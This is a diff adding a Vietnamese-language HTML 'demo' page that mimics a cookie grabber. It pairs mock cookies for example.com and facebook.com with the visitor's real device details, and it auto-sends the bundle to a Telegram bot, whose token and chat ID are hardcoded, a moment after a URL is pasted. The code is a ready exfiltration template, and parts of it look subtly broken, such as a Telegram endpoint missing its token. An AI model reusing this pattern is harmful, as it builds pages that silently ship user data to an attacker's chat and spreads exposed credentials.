@@ -1,0 +1,117 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8"/>
+<title>Full Demo Auto Run + Telegram</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>
+  body { font-family: system-ui; margin:20px; }
+  input { width:90%; padding:10px; font-size:15px; border-radius:6px; border:1px solid #ccc; }
+  button { padding:10px 15px; font-size:15px; border:none; background:#007bff; color:white; border-radius:6px; margin-top:10px; }
+  pre { background:#f5f5f5; padding:10px; border-radius:6px; border:1px solid #ddd; margin-top:20px; }
+</style>
+</head>
+<body>
+
+<h2>Full Demo — Auto Run + Telegram</h2>
+<input id="url" placeholder="Dán URL vào đây..." />
+<button id="run">Chạy mô phỏng</button>
+
+<pre id="log">Chưa chạy...</pre>
+
+<script>
+// =========================
+// 🔧 CONFIG (TỰ SỬA)
+// =========================
+const BOT_TOKEN = "8116403201:AAH6yA9lGH9gmqnZso9UzmAM6JSNyJpndqw";
+const CHAT_ID   = "6547500557";
+
+// =========================
+// MOCK DATABASE
+// =========================
+const mockDb = {
+  "example.com": {
+    cookies: [
+      {name:"session", value:"fake_session_18923", httpOnly:true},
+      {name:"uid", value:"user_123"},
+    ],
+    localStorage: {theme:"dark", lastSeen:"2025-11-01"},
+    headers: {"server":"nginx", "x-powered-by":"demo-framework"}
+  },
+  "facebook.com": {
+    cookies: [{name:"fr", value:"fakeFRcookie"}],
+    localStorage: {lang:"vi"},
+    headers: {"server":"proxy", "meta":"demo"}
+  }
+};
+
+// =========================
+// HELPERS
+// =========================
+function safeHost(u){
+  try { return new URL(u).hostname.replace(/^www\./,""); }
+  catch(e){ return null; }
+}
+
+function getDeviceInfo(){
+  return {
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    language: navigator.language,
+    screen: `x`,
+    time: new Date().toLocaleString(),
+  };
+}
+
+async function sendToTele(text){
+  const url = `https://api.telegram.org/bot/sendMessage`;
+  return fetch(url,{
+    method:"POST",
+    headers:{ "Content-Type":"application/json" },
+    body: JSON.stringify({ chat_id: CHAT_ID, text })
+  });
+}
+
+// =========================
+// MAIN
+// =========================
+async function runDemo(){
+  const raw = document.getElementById("url").value.trim();
+  const host = safeHost(raw);
+
+  if(!host){
+    document.getElementById("log").textContent = "URL không hợp lệ!";
+    return;
+  }
+
+  const mock = mockDb[host] || {cookies:[], localStorage:{}, headers:{}};
+  const device = getDeviceInfo();
+
+  const payload = {
+    host,
+    mockData: mock,
+    deviceInfo: device
+  };
+
+  // log on screen
+  document.getElementById("log").textContent =
+    "Dữ liệu mô phỏng đã chạy:\n\n" + JSON.stringify(payload,null,2);
+
+  // send to telegram
+  await sendToTele("📡 FULL DEMO\n\n" + JSON.stringify(payload,null,2));
+
+  document.getElementById("log").textContent += "\n\n📨 Đã gửi qua Telegram!";
+}
+
+document.getElementById("run").onclick = runDemo;
+
+// =========================
+// AUTO RUN KHI DÁN URL
+// =========================
+document.getElementById("url").addEventListener("input", ()=>{
+  clearTimeout(window._auto);
+  window._auto = setTimeout(runDemo, 600); // auto run 0.6s sau khi dán
+});
+</script>
+</body>
+</html>
